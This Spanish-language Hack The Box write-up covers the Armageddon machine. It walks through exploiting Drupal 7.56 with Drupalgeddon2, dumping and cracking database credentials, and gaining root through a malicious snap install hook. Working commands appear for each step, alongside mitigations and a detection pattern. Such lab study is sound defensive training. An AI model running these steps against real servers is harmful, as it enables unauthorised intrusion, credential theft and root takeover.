---
machine: Armageddon
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, drupal, cve, sudo, snap]
---

# Armageddon — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

CentOS con Apache y Drupal 7.56. La versión se confirma en `CHANGELOG.txt` y cae con Drupalgeddon2 (CVE-2018-7600), un RCE sin autenticar. Desde el RCE se lee `settings.php` con las credenciales de MySQL, se consulta la tabla de usuarios y se rompe el hash PHPass de un administrador para entrar por SSH. La escalada es un `sudo snap install *` que permite instalar un snap propio cuyo hook corre como root.

## Reconocimiento

```bash
nmap -Pn -sC -sV -p- <IP> -oN nmap.txt
```

```text
22/tcp  ssh   OpenSSH 7.4 (protocol 2.0)
80/tcp  http  Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
```

La cabecera del generador y `robots.txt` delatan Drupal; `CHANGELOG.txt` da la versión exacta:

```bash
curl -s http://<IP>/CHANGELOG.txt | head -5
# Drupal 7.56, 2017-06-21
```

Drupal 7.56 entra en el rango de CVE-2018-7600 (corregido en 7.58).

## Enumeración

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt -t 40
```

Rutas típicas: `/CHANGELOG.txt`, `/README.txt`, `/sites/default/settings.php` (no descargable directamente), `/user/login`, `/admin`.

Con el RCE se puede leer el fichero de configuración:

```bash
python3 drupa7-CVE-2018-7600.py http://<IP>/ -c "cat /var/www/html/sites/default/settings.php"
```

Dentro aparecen `$databases['default']['default']` con usuario y contraseña de MySQL. Otra vía es pedir la tabla de usuarios:

```bash
python3 drupa7-CVE-2018-7600.py http://<IP>/ -c \
  "mysql -u drupaluser -p'<dbpass>' -e 'select name,pass from drupal.users'"
```

```text
brucetherealadmin  $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
```

`$S$` es PHPass de Drupal 7; john lo trata sin problemas:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## Foothold

```bash
ssh brucetherealadmin@<IP>
# contraseña: <password>
```

Si el firewall bloquea la reverse shell, no hace falta: el RCE permite leer ficheros y ejecutar consultas, que es todo lo necesario para llegar a las credenciales. La shell interactiva se obtiene por SSH con la contraseña reutilizada.

## Movimiento lateral

- No aplica: la cadena se resuelve en un único host, sin salto lateral.
- Ver «Escalada de privilegios» para el paso de usuario a administrador.

## Escalada de privilegios

```bash
sudo -l
```

```text
User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

El comodín permite instalar un snap arbitrario. Un snap es un squashfs con metadatos y hooks; el hook `install` se ejecuta como root durante la instalación:

```bash
mkdir -p /tmp/pwn/meta/hooks
cat > /tmp/pwn/meta/snap.yaml <<'EOF'
name: pwn
version: "1.0"
summary: pwn
description: pwn
architectures: [amd64]
confinement: devmode
grade: devel
EOF
cat > /tmp/pwn/meta/hooks/install <<'EOF'
#!/bin/sh
chmod +s /bin/bash
EOF
chmod +x /tmp/pwn/meta/hooks/install
cd /tmp && mksquashfs pwn pwn.snap -noappend
```

```bash
sudo snap install /tmp/pwn.snap --dangerous --devmode
/bin/bash -p
```

`--dangerous` evita la firma y `--devmode` desactiva el confinamiento, dos cosas que el comodín de sudo no restringe.

## Evidencia

- `id` → `uid=0(root)` tras `/bin/bash -p`.
- `cat /root/root.txt` (redactado).
- `snap list` mostrando el paquete instalado.

## Lecciones aprendidas

- `CHANGELOG.txt` y `README.txt` son la forma más rápida de fijar la versión de un CMS; sin versión no hay CVE.
- Un RCE sin shell interactiva sigue sirviendo: lectura de configuración y consultas SQL bastan para escalar a credenciales.
- Los hooks de snap corren como root por diseño; permitir `snap install *` con sudo equivale a dar root.
- PHPass es lento pero rockyou lo rompe igual; no es una protección real.
- La contraseña de la base de datos estaba reutilizada en SSH: dos fallos separados que se encadenan.

## Mitigaciones y detección

- Actualizar Drupal (7.58 corrige CVE-2018-7600; hoy la rama 7 está EOL, migrar a 10/11).
- Sacar credenciales de `settings.php` del alcance del usuario web y no reutilizarlas.
- Restringir sudo por comando exacto, nunca con comodines: `snap install` sin argumentos fijos es root.
- Deshabilitar `--dangerous`/`--devmode` en producción y firmar los snaps.
- Detección: peticiones a `/?q=user/password&name[%23post_render][]=...` (patrón de Drupalgeddon2), creación de snaps fuera del repositorio, hooks que tocan `sudoers` o bits SUID.
- MITRE: T1190, T1059.004, T1548.003.

## Referencias

- CVE-2018-7600 (Drupalgeddon2).
- Documentación de snapcraft sobre hooks.
- MITRE ATT&CK: T1190, T1548.003.
